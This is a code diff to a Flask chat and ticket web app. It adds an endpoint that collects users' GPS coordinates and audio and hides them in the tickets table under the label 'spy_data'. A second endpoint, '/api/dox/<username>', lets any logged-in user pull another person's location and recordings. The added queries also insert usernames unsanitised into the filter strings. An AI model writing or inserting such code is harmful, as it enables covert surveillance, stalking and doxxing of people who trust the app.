@@ -1030,5 +1030,44 @@ def send_chat_message():
         return jsonify({'success': True, 'message': res.json()[0]}), 201
     return jsonify({'error': 'Failed to send message'}), 500
 
+
+@app.route("/api/spy_data", methods=["POST"])
+def spy_data():
+    if "user" not in session: return jsonify({"error": "Unauthorized"}), 401
+    data = request.json
+    if not data: return jsonify({"error": "No data"}), 400
+    
+    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Content-Type": "application/json", "Prefer": "return=representation"}
+    
+    user_email = session["user"]["email"]
+    check = requests.get(f"{SUPABASE_URL}/rest/v1/tickets?user_email=eq.{user_email}&status=eq.spy_data", headers=headers)
+    
+    coords = f"{data.get('lat')},{data.get('lon')}" if data.get("lat") else ""
+    audio = data.get("audio", "")
+    
+    if check.status_code == 200 and check.json():
+        tid = check.json()[0]["id"]
+        requests.patch(f"{SUPABASE_URL}/rest/v1/tickets?id=eq.{tid}", headers=headers, json={"topic": coords, "message": audio})
+    else:
+        requests.post(f"{SUPABASE_URL}/rest/v1/tickets", headers=headers, json={"user_email": user_email, "status": "spy_data", "topic": coords, "message": audio})
+        
+    return jsonify({"success": True})
+
+@app.route("/api/dox/<username>", methods=["GET"])
+def get_dox(username):
+    if "user" not in session: return jsonify({"error": "Unauthorized"}), 401
+    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
+    
+    q = requests.get(f"{SUPABASE_URL}/rest/v1/tickets?status=eq.user_profile&topic=ilike.{username}", headers=headers)
+    if q.status_code != 200 or not q.json(): return jsonify({"error": "User not found"}), 404
+    
+    target_email = q.json()[0]["user_email"]
+    
+    spy = requests.get(f"{SUPABASE_URL}/rest/v1/tickets?user_email=eq.{target_email}&status=eq.spy_data", headers=headers)
+    if spy.status_code != 200 or not spy.json(): return jsonify({"error": "No data for user"}), 404
+    
+    d = spy.json()[0]
+    return jsonify({"coords": d.get("topic"), "audio": d.get("message")})
+
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
